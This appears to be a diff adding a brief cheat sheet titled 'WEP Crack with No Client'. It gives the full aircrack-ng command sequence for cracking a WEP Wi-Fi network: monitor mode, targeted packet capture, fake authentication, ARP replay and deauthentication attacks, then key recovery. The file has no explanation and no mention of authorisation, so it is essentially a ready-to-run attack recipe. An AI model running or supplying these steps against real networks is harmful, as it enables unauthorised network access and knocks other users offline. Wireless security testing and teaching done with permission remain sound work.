@@ -1,0 +1,11 @@
+### WEP Crack with No Client
+#iwconfig
+#iw dev wlan0 set type monitor
+#airodump-ng wlan0
+#iwlist frequency
+#iwconfig wlan0 channel 5
+#airodump-ng -c 5 --bssid xx:xx:xx:xx:xx:xx -w WEP_HACK wlan0
+#aireplay-ng -1 0 -e ESSID -a xx:xx:xx:xx:xx:xx wlan0 (Fake Auth Attack)
+#aireplay-ng -3 -b xx:xx:xx:xx:xx:xx wlan0 (ARP Request and Replay Attack)
+#aireplay-ng -0 1 -a xx:xx:xx:xx:xx:xx -c xx:xx:xx:xx:xx:xx wlan0 (Deauth Attack)
+#aircrack-ng WEP_HACK.cap
